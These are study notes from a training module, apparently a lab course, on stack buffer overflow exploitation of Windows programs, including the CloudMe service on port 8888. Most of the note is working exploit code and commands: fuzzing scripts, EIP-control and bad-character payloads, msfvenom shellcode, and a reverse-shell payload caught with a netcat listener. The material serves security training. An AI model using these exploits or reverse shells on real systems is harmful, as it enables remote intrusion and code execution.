## Buffer Overflow : 

Buffer Overflows are the most common type of binary exploitation, but other types of binary exploitation exist, such as [Format String](https://owasp.org/www-community/attacks/Format_string_attack) exploitation and [Heap Exploitation](https://wiki.owasp.org/index.php/Buffer_Overflows#Heap_Overflow). A buffer overflow occurs when a program receives data that is longer than expected, such that it overwrites the entire buffer memory space on the [stack](https://en.wikipedia.org/wiki/Stack_(abstract_data_type)). This can overwrite the next Instruction Pointer `EIP` (_or `RIP` in x86_64_), which causes the program to crash because it will attempt to execute instructions at an invalid memory address.

The stack has a Last-in, First-out (LIFO) design, which means we can only `pop` out the last element `push`ed into the stack.

![[ex_stack.png]]

As we can see, when we send a string that is longer than expected, it overwrites other existing values on the stack and would even overwrite the entire stack if it is long enough. Most importantly, we see that it overwrote the value at `EIP`, and when the function tries to return to this address, the program will crash since this address '`0x6789`' does not exist in memory.

![[ex_stack_push.png]]

Whenever a function is called, a new stack frame is created, and the old `EIP` address gets pushed to the top of the new stack frame, so the program knows where to return once the function is finished.

## Debugging Windows Programs :

To successfully identify and exploit buffer overflows in Windows programs, we need to debug the program to follow its execution flow and its data in memory. In this module, we will be using [x64dbg](https://github.com/x64dbg/x64dbg). 

## Fuzzing Parameters : 

For stack-based buffer overflow exploitation, we usually follow five main steps to identify and exploit the buffer overflow vulnerability:

1. Fuzzing Parameters
2. Controlling EIP
3. Identifying Bad Characters
4. Finding a Return Instruction
5. Jumping to Shellcode

Usually, the first step in any binary vulnerability exercise is fuzzing various parameters and any other input the program accepts to see whether our input can cause the application to crash.

![[Input_fields.png]]

These are the main parameters we usually fuzz, but many other parameters may be exploitable as well.

```powershell-session
PS C:\Users\htb-student\Desktop> python -c "print('A'*10000)"
```

```powershell-session
PS C:\Users\htb-student\Desktop> python -c "print('A'*10000, file=open('fuzz.wav', 'w'))"
```

## Controlling EIP : 

So far, we have successfully fuzzed parameters and identified a vulnerable entry point. Our next step would be to precisely control what address gets placed in `EIP`

To create a unique pattern : 

```shell
NolanCarougeHTB@htb[/htb]$ /usr/bin/msf-pattern_create -l 5000
```

```shell
NolanCarougeHTB@htb[/htb]$ /usr/bin/msf-pattern_offset -q 31684630
```

```powershell-session
ERC --pattern c 5000
```

```powershell-session
ERC --pattern o 1hF0
```

Our final step is to ensure we can control what value goes into `EIP`. Knowing the offset, we know exactly how far our `EIP` is from the start of the buffer. So, if we send `4112` bytes, the next 4 bytes would be the ones that fill `EIP`.

```python
def eip_control():
    offset = 4112
    buffer = b"A"*offset
    eip = b"B"*4
    payload = buffer + eip
    
    with open('control.wav', 'wb') as f:
        f.write(payload)

eip_control()
```

## Identifying Bad Characters : 

Before we start to utilize the fact that we can control the `EIP` and subvert the program's execution flow, we need to determine any characters we should avoid using in our payload. For example, a very common bad character is a null byte `0x00`.

To identify bad characters, we have to send all characters after filling the `EIP` address, which is after `4112` + `4` bytes. We then check whether any of the characters got removed by the program or if our input got truncated prematurely after a specific character.

```python
def bad_chars():
    all_chars = bytes([
        0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
        ...SNIP...
        0xF8, 0xF9, 0xFA, 0xFB, 0xFC, 0xFD, 0xFE, 0xFF
    ])
    
    offset = 4112
    buffer = b"A"*offset
    eip = b"B"*4
    payload = buffer + eip + all_chars
    
    with open('chars.wav', 'wb') as f:
        f.write(payload)

bad_chars()
```

```python
def bad_chars():
    all_chars = bytes([
        0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08
		...SNIP...
```


Or

```cmd-session
ERC --bytearray
```

Once we have the value of `ESP`, we can use `ERC --compare` and give it the `ESP` address and the location of the `.bin` file that contains all characters, as follows:

```cmd
ERC --compare 0014F974 C:\Users\htb-student\Desktop\ByteArray_1.bin
```

```cmd-session
ERC --bytearray -bytes 0x00
```

## Finding a Return Instruction : 

As we have confirmed that we can control the address stored in `EIP` when the program executes the return instruction `ret`, we know that we can subvert the program execution and have it execute any instruction we want by writing the instruction's address to `EIP`, which would get executed after the return instruction `ret`. We will utilize a method known as `Jumping to Stack`.

To direct the execution flow to the stack, we must write an address to `EIP` to do so. This can be done in two ways :

1. Write the `ESP` address (top of the stack) to `EIP`, so it starts executing code found at the top stack
2. Using a `JMP ESP` instruction, which directs the execution flow to the stack

The more reliable way of executing shellcode loaded on the stack is to find an instruction used by the program that directs the program's execution flow to the stack. We can use several such instructions, but we will be using the most basic one, `JMP ESP`, that jumps to the top of the stack and continues the execution.

```cmd-session
ERC --ModuleInfo
```

We find many modules loaded by the program. However, we can skip any files with :

- `NXCompat`: As we are looking for a `JMP ESP` instruction, so the file should not have stack execution protection.
- `Rebase` or `ASLR`: Since these protections would cause the addresses to change between runs


`ctrl+f`, which allows us to search for any instruction within the opened file `cdextract.exe`.
Now we can search using this pattern by clicking `ctrl+b` in the `CPU` pane and entering the pattern `54C3` for PUSH ESP; RET.

## Jumping to Shellcode : 

```shell-session
NolanCarougeHTB@htb[/htb]$ msfvenom -l payloads | grep
```

```shell-session
NolanCarougeHTB@htb[/htb]$ msfvenom -p 'windows/shell_reverse_tcp' LHOST=OUR_IP LPORT=OUR_LISTENING_PORT -f 'python' -b '\x00'
```

```python
def exploit():
    # msfvenom -p 'windows/exec' CMD='calc.exe' -f 'python' -b '\x00'
    buf =  b""
    buf += b"\xd9\xec\xba\x3d\xcb\x9e\x28\xd9\x74\x24\xf4\x58\x29"
    ...SNIP...
    buf += b"\xfd\x2c\x39\x51\x60\xbf\xa1\xb8\x07\x47\x43\xc5"
```

1. `buffer`: We can fill the buffer by writing `b"A"*offset`
2. `EIP`: The following 4 bytes should be our return address
3. `buf`: After that, we can add our shellcode

In the previous section, we've found multiple return addresses that can work in executing any shellcode we write on the stack:

![[esp_jmpesp.png]]

```python
def exploit():
    # msfvenom -p 'windows/exec' CMD='calc.exe' -f 'python' -b '\x00'
    buf = b""
    ...SNIP...
    buf += b"\xfd\x2c\x39\x51\x60\xbf\xa1\xb8\x07\x47\x43\xc5"

    offset = 4112
    buffer = b"A"*offset
    eip = pack('<L', 0x00419D0B)
    nop = b"\x90"*32
    payload = buffer + eip + nop + buf

    with open('exploit.wav', 'wb') as f:
        f.write(payload)

exploit()
```

## Remote Fuzzing : 

Whether we are debugging a local program or one that listens for remote connections, we will have to install and debug it locally on our Windows VM. Once our exploit is fully developed, we can then run it on the remote service without needing local access.

This time, we will be debugging a program called `CloudMe`, an end-user tool for a file sharing service.

```powershell-session
PS C:\htb> netstat -a

...SNIP...
TCP    0.0.0.0:8888           0.0.0.0:0              LISTENING
[CloudMe.exe]
```

We can use the `netcat` program on the Desktop to interact with this port and see if it accepts any parameters:

```powershell-session
PS C:\Users\htb-student\Desktop> .\nc.exe 127.0.0.1 8888
?
PS C:\Users\htb-student\Desktop> .\nc.exe 127.0.0.1 8888
help
```

To debug a program that listens on a remote port, we will follow the same process we did earlier in the module, run the program, and attach to or open it directly in `x32dbg`.

```python
import socket
from struct import pack

IP = "127.0.0.1"
port = 8888

def fuzz():
    try:
        for i in range(0,10000,500):
            buffer = b"A"*i
            print("Fuzzing %s bytes" % i)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((IP , port))
            s.send(buffer)
            breakpoint()
            s.close()
    except:
        print("Could not establish a connection")

fuzz()
```

## Building a Remote Exploit : 

After fuzzing the listening port, the remaining buffer overflow identification and exploitation steps should be largely the same as local buffer overflow exploitation. The main steps we followed in previous sections were :

1. Fuzzing Parameters
2. Controlling EIP
3. Identifying Bad Characters
4. Finding a Return Instruction
5. Jumping to Shellcode

We'll start by creating a unique pattern `2000` bytes long, using `ERC --pattern c 2000` as we previously did. Now we can use `ERC --pattern o 1jB0` to calculate the exact offset, which is found at `1052` bytes. Our next step is to identify whether we should avoid using any bad characters in our input. We can start by running `ERC --bytearray` in `x32dbg` to create our `ByteArray_1.bin` file. Once we restart our program in `x32dbg` and run our exploit, we can use `ERC --compare` to compare the bytes at the `ESP` address with the `ByteArray_1.bin` file. Now that we have control over `EIP` and know which bad characters to avoid in our payload, we need to find an instruction to execute the payload we will place on the stack.

## Remote Exploitation : 

First, we need to find our machine's IP, which should be reachable by the remote server (in the same network subnet).

Next, we will generate the shellcode that will send us a reverse shell, which we can get with the `windows/shell_reverse_tcp` payload in `msfvenom`, as follows :

```shell-session
NolanCarougeHTB@htb[/htb]$ msfvenom -p 'windows/shell_reverse_tcp' LHOST=10.10.15.10 LPORT=1234 -f 'python'
```

After that, we can start a `netcat` listener to receive the reverse shell, as follows :

```shell-session
NolanCarougeHTB@htb[/htb]$ nc -lvnp 1234
```